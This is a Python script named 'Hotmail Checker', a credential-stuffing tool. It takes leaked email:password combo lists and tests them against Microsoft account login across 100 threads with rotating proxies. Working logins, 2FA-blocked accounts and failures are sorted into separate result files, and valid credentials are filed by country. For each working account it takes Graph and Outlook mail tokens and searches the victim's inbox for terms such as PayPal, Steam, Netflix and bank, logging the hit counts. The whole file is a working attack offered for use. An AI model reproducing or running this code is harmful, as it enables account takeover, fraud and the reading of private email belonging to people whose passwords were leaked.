import concurrent.futures
import configparser
import os
import random
import re
import sys
import threading
import time
import uuid
import requests
import urllib3
import ctypes
import json
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from requests.adapters import HTTPAdapter
from collections import deque
from urllib3.util.retry import Retry
from colorama import Fore, Style, init

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

GRAY = '\033[90m'
BLUE = '\033[94m'
ORANGE = '\033[38;5;208m'
GREEN = '\033[92m'
RED = '\033[91m'

LEFT_COL_WIDTH = 55

def visible_length(s):
    return len(re.sub(r'\033\[[0-9;]*[a-zA-Z]', '', s))

def pad_to_column(left_part):
    n = LEFT_COL_WIDTH - visible_length(left_part)
    return left_part + (" " * n if n > 0 else " ")

def get_flag(country_code: str) -> str:
    flag_map = {
        'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪',
        'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'BR': '🇧🇷', 'IN': '🇮🇳',
        'JP': '🇯🇵', 'KR': '🇰🇷', 'CN': '🇨🇳', 'RU': '🇷🇺', 'MX': '🇲🇽',
        'SA': '🇸🇦', 'AE': '🇦🇪', 'TR': '🇹🇷', 'NL': '🇳🇱', 'SE': '🇸🇪',
        'NO': '🇳🇴', 'DK': '🇩🇰', 'FI': '🇫🇮', 'PL': '🇵🇱', 'CZ': '🇨🇿',
        'GR': '🇬🇷', 'PT': '🇵🇹', 'IE': '🇮🇪', 'CH': '🇨🇭', 'AT': '🇦🇹',
        'BE': '🇧🇪', 'LU': '🇱🇺', 'IS': '🇮🇸', 'NZ': '🇳🇿', 'SG': '🇸🇬',
        'MY': '🇲🇾', 'ID': '🇮🇩', 'TH': '🇹🇭', 'VN': '🇻🇳', 'PH': '🇵🇭'
    }
    return flag_map.get(country_code.upper(), '🏴')

def normalize_combo(line):
    line = line.strip()
    if not line:
        return None
    
    if ':' in line:
        parts = line.split(':', 1)
        email = parts[0].strip()
        password = parts[1].strip()
        if email and password and '@' in email:
            return f"{email}:{password}"
    
    if '|' in line:
        parts = line.split('|', 1)
        email = parts[0].strip()
        password = parts[1].strip()
        if email and password and '@' in email:
            return f"{email}:{password}"
    
    if ';' in line:
        parts = line.split(';', 1)
        email = parts[0].strip()
        password = parts[1].strip()
        if email and password and '@' in email:
            return f"{email}:{password}"
    
    if ',' in line:
        parts = line.split(',', 1)
        email = parts[0].strip()
        password = parts[1].strip()
        if email and password and '@' in email:
            return f"{email}:{password}"
    
    if ' ' in line:
        parts = line.split(' ', 1)
        email = parts[0].strip()
        password = parts[1].strip()
        if email and password and '@' in email:
            return f"{email}:{password}"
    
    if '\t' in line:
        parts = line.split('\t', 1)
        email = parts[0].strip()
        password = parts[1].strip()
        if email and password and '@' in email:
            return f"{email}:{password}"
    
    if '@' in line and line.count('@') == 1:
        return None
    
    return None

def load_and_normalize_accounts(filepath):
    accounts = []
    with open(filepath, 'r', encoding='utf-8') as f:
        lines = f.readlines()
    
    for line in lines:
        normalized = normalize_combo(line)
        if normalized:
            accounts.append(normalized)
    
    return accounts

if sys.platform == 'win32':
    os.system('cls')
    try:
        ctypes.windll.kernel32.SetConsoleTitleW("Hotmail Checker | Starting...")
    except:
        pass
else:
    os.system('clear')

print_lock = threading.Lock()
file_lock = threading.Lock()
stats_lock = threading.Lock()

stats = {
    'checked': 0,
    'valid': 0,
    'inbox': 0,
    'custom': 0,
    'bad': 0,
    '2fa': 0,
    'errors': 0,
    'retries': 0,
    'cpm': 0
}

TOTAL_ACCOUNTS = 0
SESSION_FOLDER = None
start_time = time.time()

def get_session_folder():
    global SESSION_FOLDER
    if SESSION_FOLDER is None:
        base = "Results"
        if not os.path.exists(base):
            os.makedirs(base)
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        SESSION_FOLDER = os.path.join(base, f"Inbox_{timestamp}")
        os.makedirs(SESSION_FOLDER, exist_ok=True)
        os.makedirs(os.path.join(SESSION_FOLDER, "Countries"), exist_ok=True)
        os.makedirs(os.path.join(SESSION_FOLDER, "Keywords"), exist_ok=True)
    return SESSION_FOLDER

def ensure_keywords_file():
    path = "keywords.txt"
    if not os.path.exists(path):
        default = """Steam
Netflix
PayPal
Amazon
Security Alert"""
        with open(path, 'w', encoding='utf-8') as f:
            f.write(default)
    return path

def load_keywords_from_file():
    path = ensure_keywords_file()
    try:
        with open(path, 'r', encoding='utf-8') as f:
            keywords = []
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    keywords.append(line)
        
        if not keywords:
            keywords = ["Steam", "Netflix", "PayPal", "Amazon", "Bank"]
        
        return keywords
    except Exception as e:
        return ["Steam", "Netflix", "PayPal"]

class ConfigLoader:
    def __init__(self, config_file='config_inbox.ini'):
        self.config_file = config_file
        self.config = configparser.ConfigParser()
        self.settings = {}
        self.load_config()

    def load_config(self):
        if not os.path.exists(self.config_file):
            self.create_default_config()
        
        try:
            self.config.read(self.config_file, encoding='utf-8')
            self.parse_config()
        except Exception as e:
            self.create_default_config()
            self.parse_config()

    def create_default_config(self):
        if not 'General' in self.config:
            self.config['General'] = {}
        self.config['General'] = {
            'threads': '100',
            'timeout': '15',
            'proxies_file': 'proxies.txt',
            'accounts_file': 'acc.txt'
        }
        with open(self.config_file, 'w', encoding='utf-8') as f:
            self.config.write(f)

    def parse_config(self):
        self.settings['threads'] = self.config.getint('General', 'threads', fallback=100)
        self.settings['timeout'] = self.config.getint('General', 'timeout', fallback=15)
        self.settings['proxies_file'] = self.config.get('General', 'proxies_file', fallback='proxies.txt')
        self.settings['accounts_file'] = self.config.get('General', 'accounts_file', fallback='acc.txt')

config_loader = ConfigLoader()
CONFIG = config_loader.settings

def save_result(filename, content):
    folder = get_session_folder()
    path = os.path.join(folder, filename)
    with file_lock:
        with open(path, 'a', encoding='utf-8') as f:
            f.write(content + '\n')

def save_country_result(country, email, password):
    folder = os.path.join(get_session_folder(), 'Countries')
    path = os.path.join(folder, f"{country}.txt")
    with file_lock:
        with open(path, 'a', encoding='utf-8') as f:
            f.write(f"{email}:{password}\n")

def get_keywords_folder():
    return os.path.join(get_session_folder(), 'Keywords')

def save_keyword_result(keyword, content):
    safe_name = re.sub(r'[<>:"/\\|?*]', '_', keyword.strip()) or 'keyword'
    path = os.path.join(get_keywords_folder(), f"{safe_name}.txt")
    with file_lock:
        with open(path, 'a', encoding='utf-8') as f:
            f.write(content + '\n')

def format_proxy(proxy):
    if not proxy: return None
    proxy = proxy.strip()
    
    if proxy.startswith('http'):
        return proxy
        
    parts = proxy.split(':')
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif '@' in proxy:
        return f"http://{proxy}"
    else:
        return f"http://{proxy}"

def create_optimized_session():
    session = requests.Session()
    threads = CONFIG.get('threads', 100)
    pool_size = threads + 50
    
    retry_strategy = Retry(
        total=2,
        backoff_factor=0.3,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "POST", "OPTIONS"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=pool_size, pool_maxsize=pool_size)
    session.mount("https://", adapter)
    session.mount("http://", adapter)
    return session

class MicrosoftInboxChecker:
    def __init__(self, email, password, proxy=None, inbox_keywords=None):
        self.email = email
        self.password = password
        self.proxy = proxy
        self.inbox_keywords = inbox_keywords if inbox_keywords else ["Steam", "Netflix", "PayPal"]
        self.session = create_optimized_session()
        self.session.proxies = {'http': proxy, 'https': proxy} if proxy else None
        self.access_token = None
        self.cid = None
        self.country = None
        self.name = None
        self.sFTTag_url = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'

    def get_urlPost_sFTTag(self):
        maxretries = 3
        attempts = 0
        
        while attempts < maxretries:
            try:
                headers = {
                    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0", 
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
                    'Accept-Language': 'en-US,en;q=0.9', 
                    'Accept-Encoding': 'gzip, deflate, br', 
                    'Connection': 'keep-alive', 
                    'Upgrade-Insecure-Requests': '1'
                }
                
                text = self.session.get(self.sFTTag_url, headers=headers, timeout=CONFIG['timeout'], verify=False).text
                
                match = re.search('value=\\\\\\"(.+?)\\\\\\"', text, re.S) or \
                       re.search('value="(.+?)"', text, re.S) or \
                       re.search("sFTTag:'(.+?)'", text, re.S) or \
                       re.search('sFTTag:"(.+?)"', text, re.S) or \
                       re.search('name="PPFT".*?value="(.+?)"', text, re.S)
                
                if match:
                    sFTTag = match.group(1)
                    match = re.search('"urlPost":"(.+?)"', text, re.S) or \
                           re.search("urlPost:'(.+?)'", text, re.S) or \
                           re.search('urlPost:"(.+?)"', text, re.S) or \
                           re.search('<form.*?action="(.+?)"', text, re.S)
                    
                    if match:
                        urlPost = match.group(1)
                        urlPost = urlPost.replace('&amp;', '&')
                        return urlPost, sFTTag
            except Exception:
                pass
            
            attempts += 1
            time.sleep(0.5)
        
        return None, None

    def get_xbox_rps(self, urlPost, sFTTag):
        maxretries = 3
        tries = 0
        
        while tries < maxretries:
            try:
                data = {'login': self.email, 'loginfmt': self.email, 'passwd': self.password, 'PPFT': sFTTag}
                headers = {
                    'Content-Type': 'application/x-www-form-urlencoded', 
                    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36", 
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
                    'Accept-Language': 'en-US,en;q=0.9', 
                    'Accept-Encoding': 'gzip, deflate, br', 
                    'Connection': 'close'
                }
                
                login_request = self.session.post(urlPost, data=data, headers=headers, allow_redirects=True, timeout=CONFIG['timeout'], verify=False)
                
                if '#' in login_request.url and login_request.url != self.sFTTag_url:
                    token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ['None'])[0]
                    if token != 'None':
                        return 'SUCCESS'
                
                elif 'cancel?mkt=' in login_request.text:
                    try:
                        ipt = re.search(r'(?<="ipt" value=").+?(?=">)', login_request.text)
                        pprid = re.search(r'(?<="pprid" value=").+?(?=">)', login_request.text)
                        uaid = re.search(r'(?<="uaid" value=").+?(?=">)', login_request.text)
                        
                        if ipt and pprid and uaid:
                            data = {'ipt': ipt.group(), 'pprid': pprid.group(), 'uaid': uaid.group()}
                            
                            action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', login_request.text)
                            if action:
                                ret = self.session.post(action.group(), data=data, allow_redirects=True, timeout=CONFIG['timeout'], verify=False)
                                
                                return_url = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text)
                                if return_url:
                                    fin = self.session.get(return_url.group(), allow_redirects=True, timeout=CONFIG['timeout'], verify=False)
                                    token = parse_qs(urlparse(fin.url).fragment).get('access_token', ['None'])[0]
                                    if token != 'None':
                                        return 'SUCCESS'
                    except:
                        pass
                
                elif any(value in login_request.text for value in ['recover?mkt', 'account.live.com/identity/confirm?mkt', 'Email/Confirm?mkt', '/Abuse?mkt=']):
                    return '2FA'
                
                elif any(value in login_request.text.lower() for value in [
                    'password is incorrect', 
                    "account doesn't exist", 
                    "that microsoft account doesn't exist",
                    'sign in to your microsoft account',
                    "tried to sign in too many times with an incorrect account or password",
                    'help us protect your account'
                ]):
                    return 'BAD'
                
            except Exception:
                pass
            
            tries += 1
            time.sleep(0.5)
        
        return 'BAD'

    def login(self):
        urlPost, sFTTag = self.get_urlPost_sFTTag()
        if not urlPost or not sFTTag:
            return 'BAD'
        
        return self.get_xbox_rps(urlPost, sFTTag)

    def get_graph_token(self):
        try:
            client_id = '0000000048170EF2'
            scope = 'https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Mail.ReadWrite'
            
            auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
            
            r = self.session.get(auth_url, timeout=CONFIG['timeout'], verify=False)
            parsed_fragment = parse_qs(urlparse(r.url).fragment)
            token = parsed_fragment.get('access_token', [None])[0]
            
            if not token:
                scope = 'https://graph.microsoft.com/Mail.Read'
                auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
                r = self.session.get(auth_url, timeout=CONFIG['timeout'], verify=False)
                parsed_fragment = parse_qs(urlparse(r.url).fragment)
                token = parsed_fragment.get('access_token', [None])[0]
            
            return token
        except:
            return None

    def get_profile_via_graph(self, token):
        try:
            headers = {
                'Authorization': f'Bearer {token}',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0'
            }
            
            r = self.session.get('https://graph.microsoft.com/v1.0/me', headers=headers, timeout=10, verify=False)
            
            if r.status_code == 200:
                data = r.json()
                self.country = data.get('country', data.get('mobilePhone', 'Unknown'))
                if not self.country or self.country == 'Unknown':
                    try:
                        r2 = self.session.get('https://graph.microsoft.com/v1.0/me/mailboxSettings', headers=headers, timeout=10, verify=False)
                        if r2.status_code == 200:
                            settings = r2.json()
                            self.country = settings.get('timeZone', 'Unknown')
                    except:
                        pass
                
                self.name = data.get('displayName', 'Unknown')
                return True
            return False
        except:
            return False

    def get_profile_via_substrate(self):
        try:
            self.session.get('https://outlook.live.com/owa/', timeout=10, verify=False)
            
            scope = 'https://substrate.office.com/User-Internal.ReadWrite'
            client_id = '0000000048170EF2'
            auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
            
            r = self.session.get(auth_url, timeout=CONFIG['timeout'], verify=False)
            parsed_fragment = parse_qs(urlparse(r.url).fragment)
            token = parsed_fragment.get('access_token', [None])[0]
            
            if not token:
                return False
            
            self.cid = self.session.cookies.get('MSPCID', self.email)
            
            headers = {
                'Authorization': f'Bearer {token}',
                'X-AnchorMailbox': f'CID:{self.cid}',
                'Content-Type': 'application/json',
                'User-Agent': 'Outlook-Android/2.0',
                'Accept': 'application/json'
            }
            
            r = self.session.get('https://substrate.office.com/profileb2/v2.0/me/V1Profile', headers=headers, timeout=10, verify=False)
            
            if r.status_code == 200:
                data = r.json()
                self.country = data.get('accounts', [{}])[0].get('location', 'Unknown')
                self.name = data.get('names', [{}])[0].get('displayName', 'Unknown')
                return True
            return False
        except:
            return False

    def check_inbox_via_graph(self):
        token = self.get_graph_token()
        if not token:
            return 0, []
        
        found_info = []
        total_found_sum = 0
        
        headers = {
            'Authorization': f'Bearer {token}',
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        }
        
        for keyword in self.inbox_keywords:
            try:
                query = f"https://graph.microsoft.com/v1.0/me/messages?$search=\"subject:{keyword}\"&$select=subject,receivedDateTime&$top=25"
                r = self.session.get(query, headers=headers, timeout=10, verify=False)
                
                if r.status_code == 200:
                    data = r.json()
                    total = data.get('@odata.count', 0)
                    
                    if total == 0 and 'value' in data:
                        total = len(data['value'])
                    
                    if total > 0:
                        total_found_sum += total
                        found_info.append(f"{keyword}: {total}")
                        
                        try:
                            query2 = f"https://graph.microsoft.com/v1.0/me/messages?$search=\"body:{keyword}\"&$select=subject&$top=25"
                            r2 = self.session.get(query2, headers=headers, timeout=10, verify=False)
                            if r2.status_code == 200:
                                data2 = r2.json()
                                total2 = data2.get('@odata.count', len(data2.get('value', [])))
                                if total2 > 0:
                                    total_found_sum += total2
                                    found_info.append(f"{keyword}(body): {total2}")
                        except:
                            pass
            except:
                pass
        
        return total_found_sum, found_info

    def check_inbox(self):
        total_found, found_info = self.check_inbox_via_graph()
        
        if total_found > 0:
            return total_found, found_info
        
        token = self.get_access_token_for_outlook()
        if not token:
            return 0, []
        
        cid = self.session.cookies.get('MSPCID', self.email)
        
        headers = {
            'Authorization': f'Bearer {token}',
            'X-AnchorMailbox': f'CID:{cid}',
            'Content-Type': 'application/json',
            'User-Agent': 'Outlook-Android/2.0',
            'Accept': 'application/json',
            'Host': 'substrate.office.com'
        }

        found_info = []
        total_found_sum = 0
        
        url = 'https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124'
        
        for keyword in self.inbox_keywords:
            try:
                payload = {
                    'Cvid': str(uuid.uuid4()),
                    'Scenario': {'Name': 'owa.react'},
                    'TimeZone': 'UTC',
                    'TextDecorations': 'Off',
                    'EntityRequests': [{
                        'EntityType': 'Conversation',
                        'ContentSources': ['Exchange'],
                        'Filter': {'Or': [{'Term': {'DistinguishedFolderName': 'msgfolderroot'}}, {'Term': {'DistinguishedFolderName': 'DeletedItems'}}]},
                        'From': 0,
                        'Query': {'QueryString': keyword},
                        'Size': 25,
                        'EnableTopResults': True,
                        'TopResultsCount': 3
                    }],
                    'AnswerEntityRequests': [{'Query': {'QueryString': keyword}, 'EntityTypes': ['Event', 'File'], 'From': 0, 'Size': 10, 'EnableAsyncResolution': True}],
                    'QueryAlterationOptions': {'EnableSuggestion': True, 'EnableAlteration': True}
                }
                
                r = self.session.post(url, json=payload, headers=headers, timeout=10, verify=False)
                if r.status_code == 200:
                    data = r.json()
                    total = 0
                    if 'EntitySets' in data:
                        for entity_set in data['EntitySets']:
                            if 'ResultSets' in entity_set:
                                for result_set in entity_set['ResultSets']:
                                    if 'Total' in result_set:
                                        total = result_set['Total']
                                    elif 'ResultCount' in result_set:
                                        total = result_set['ResultCount']
                                    elif 'Results' in result_set:
                                        total = len(result_set['Results'])
                    
                    if total > 0:
                        total_found_sum += total
                        found_info.append(f"{keyword}: {total}")
            except:
                pass
                
        return total_found_sum, found_info

    def get_access_token_for_outlook(self):
        try:
            self.session.get('https://outlook.live.com/owa/', timeout=10, verify=False)
            
            scope = 'https://substrate.office.com/User-Internal.ReadWrite'
            client_id = '0000000048170EF2'
            auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
            
            r = self.session.get(auth_url, timeout=CONFIG['timeout'], verify=False)
            parsed_fragment = parse_qs(urlparse(r.url).fragment)
            token = parsed_fragment.get('access_token', [None])[0]
            
            if not token:
                auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope=service::outlook.office.com::MBI_SSL&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
                r = self.session.get(auth_url, timeout=CONFIG['timeout'], verify=False)
                parsed_fragment = parse_qs(urlparse(r.url).fragment)
                token = parsed_fragment.get('access_token', [None])[0]
                
            return token
        except:
            return None

def check_account_wrapper(combo, index, limiter, inbox_keywords):
    try:
        check_account(combo, index, inbox_keywords)
    finally:
        limiter.release()

def check_account(combo, index, inbox_keywords):
    global proxies
    try:
        if ':' not in combo:
            return
        
        email, password = combo.split(':', 1)
        email = email.strip()
        password = password.strip()
        
        proxy = None
        if proxies:
            proxy = format_proxy(random.choice(proxies))
        
        checker = MicrosoftInboxChecker(email, password, proxy, inbox_keywords=inbox_keywords)
        
        status = checker.login()

        if status == 'SUCCESS':
            with stats_lock:
                stats['valid'] += 1
            
            save_result('Valid.txt', f"{email}:{password}")
            
            graph_token = checker.get_graph_token()
            country_obtained = False
            country = 'Unknown'
            
            if graph_token:
                if checker.get_profile_via_graph(graph_token):
                    country = checker.country or 'Unknown'
                    country_obtained = True
            
            if not country_obtained:
                if checker.get_profile_via_substrate():
                    country = checker.country or 'Unknown'
            
            if country and country != 'Unknown':
                save_country_result(country, email, password)
            
            total_count, inbox_hits = checker.check_inbox()
            
            flag = get_flag(country) if country != 'Unknown' else '🏴'
            
            if total_count > 0:
                hits_str = ' | '.join(inbox_hits)
                save_string = f"{email}:{password} | {country} | {total_count} Email Found | [{hits_str}]"
                save_result('Inbox.txt', save_string)
                for hit in inbox_hits:
                    if ': ' in hit:
                        kw, count = hit.rsplit(': ', 1)
                        line = f"{email}:{password} | {country} | {count} Email Found | [{kw}: {count}]"
                        save_keyword_result(kw, line)
                
                with stats_lock:
                    stats['inbox'] += 1
                
                with print_lock:
                    left = f"{Fore.GREEN}[+]{Fore.GREEN} {email}{Style.RESET_ALL}"
                    right_parts = [f"{GRAY}| {flag}{country} | Keywords: {Style.RESET_ALL}"]
                    for i, hit in enumerate(inbox_hits):
                        if ': ' in hit:
                            kw, count = hit.rsplit(': ', 1)
                            right_parts.append(f"{GRAY}{kw}: {Style.RESET_ALL}{BLUE}{count}{Style.RESET_ALL}")
                        else:
                            right_parts.append(f"{GRAY}{hit}{Style.RESET_ALL}")
                        if i < len(inbox_hits) - 1:
                            right_parts.append(f"{GRAY} | {Style.RESET_ALL}")
                    right = "".join(right_parts)
                    print(f"{pad_to_column(left)}{right}")
            else:
                with print_lock:
                    left = f"{Fore.GREEN}[+]{Fore.GREEN} {email}{Style.RESET_ALL}"
                    right = f"{GRAY}| {flag}{country} | valid microsoft{Style.RESET_ALL}"
                    print(f"{pad_to_column(left)}{right}")
            
        elif status == '2FA':
            with stats_lock:
                stats['2fa'] += 1
            save_result('2FA.txt', f"{email}:{password}")
            with print_lock:
                left = f"{ORANGE}[?]{ORANGE} {email}{Style.RESET_ALL}"
                right = f"{GRAY}| 2FA{Style.RESET_ALL}"
                print(f"{pad_to_column(left)}{right}")
            
        else:
            with stats_lock:
                stats['bad'] += 1
            with print_lock:
                left = f"{Fore.RED}[-]{Fore.RED} {email}{Style.RESET_ALL}"
                right = f"{GRAY}| invalid microsoft{Style.RESET_ALL}"
                print(f"{pad_to_column(left)}{right}")
    
    except Exception as e:
        with stats_lock:
            stats['errors'] += 1
        print(f"{Fore.RED}[!] Thread Error: {e}")
    finally:
        with stats_lock:
            stats['checked'] += 1
        update_title()

def update_title():
    processed = stats['checked']
    elapsed = time.time() - start_time
    cpm = int(processed / elapsed * 60) if elapsed > 1 else 0
    
    title = f"Hotmail Checker | Valid: {stats['valid']} | Inbox: {stats['inbox']} | 2FA: {stats['2fa']} | Bad: {stats['bad']} | Checked:{processed}/{TOTAL_ACCOUNTS} | Cpm: {cpm}"
    if sys.platform == 'win32':
        try:
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        except:
            pass

def main():
    if sys.platform == 'win32':
        os.system('cls')
    else:
        os.system('clear')

    print(f"{Fore.CYAN}██╗   ██╗██████╗ ██████╗ ██╗  ██╗")
    print(f"{Fore.CYAN}██║   ██║██╔══██╗██╔══██╗██║  ██║")
    print(f"{Fore.CYAN}██║   ██║██████╔╝██║  ██║███████║")
    print(f"{Fore.CYAN}██║   ██║██╔═══╝ ██║  ██║██╔══██║")
    print(f"{Fore.CYAN}╚██████╔╝██║     ██████╔╝██║  ██║")
    print(f"{Fore.CYAN} ╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝")
    print()

    inbox_keywords = load_keywords_from_file()
    get_session_folder()
    
    print(f"{Fore.CYAN}[*] Session folder: {get_session_folder()}")
    print(f"{Fore.CYAN}[*] Graph API enabled for faster inbox checking")
    print(f"{Fore.CYAN}[*] Loaded {len(inbox_keywords)} keywords")
    print()

    global proxies
    proxies = []
    
    if os.path.exists(CONFIG['proxies_file']):
        with open(CONFIG['proxies_file'], 'r', encoding='utf-8') as f:
            proxies = [line.strip() for line in f if line.strip()]
        if proxies:
            print(f"{Fore.GREEN}[*] Loaded {len(proxies)} proxies")
    else:
        print(f"{Fore.YELLOW}[!] Proxies file not found: {CONFIG['proxies_file']}")

    if not os.path.exists(CONFIG['accounts_file']):
        print(f"{Fore.RED}[!] Accounts file not found: {CONFIG['accounts_file']}")
        with open(CONFIG['accounts_file'], 'w') as f:
            f.write("email:pass\n")
        print(f"{Fore.YELLOW}[*] Created dummy {CONFIG['accounts_file']}. Please add accounts.")
        return

    accounts = load_and_normalize_accounts(CONFIG['accounts_file'])
    
    if not accounts:
        return

    global TOTAL_ACCOUNTS
    TOTAL_ACCOUNTS = len(accounts)
    
    print(f"{Fore.CYAN}[*] Threads: {CONFIG['threads']}")
    print()

    def ui_loop():
        while stats['checked'] < len(accounts):
            time.sleep(1)
            update_title()

    threading.Thread(target=ui_loop, daemon=True).start()

    max_threads = CONFIG['threads']
    print(f"{Fore.CYAN}[*] Starting Worker Loop with {max_threads} dynamic threads...")
    
    accounts_deque = deque(accounts)
    thread_limiter = threading.BoundedSemaphore(max_threads)
    
    current_index = 0
    while accounts_deque:
        thread_limiter.acquire() 
            
        account = accounts_deque.popleft()
        current_index += 1
        t = threading.Thread(target=check_account_wrapper, args=(account, current_index, thread_limiter, inbox_keywords))
        t.start()

    
    while threading.active_count() > 2:
        time.sleep(1)
        update_title()
    
    elapsed = time.time() - start_time
    print(f"\n{Fore.GREEN}[*] Checking Completed in {elapsed:.2f}s")
    print(f"Valid: {stats['valid']}")
    print(f"Inbox Hits: {stats['inbox']}")
    print(f"2FA: {stats['2fa']}")
    print(f"Bad: {stats['bad']}")
    print(f"Errors: {stats['errors']}")
    print(f"Results saved in: {get_session_folder()}")
    input("Press Enter to exit...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nExiting...")
        sys.exit()
